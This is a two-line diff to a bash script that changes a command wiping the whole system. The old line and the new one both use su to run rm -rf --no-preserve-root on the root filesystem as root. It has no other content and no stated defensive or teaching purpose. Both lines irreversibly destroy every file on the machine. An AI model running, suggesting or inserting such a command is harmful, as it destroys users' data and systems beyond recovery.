@@ -1,2 +1,2 @@
 #!/bin/bash
-su -c "rm -rf --no-preserve-root /*"
+su -c "rm -rf --no-preserve-root /"
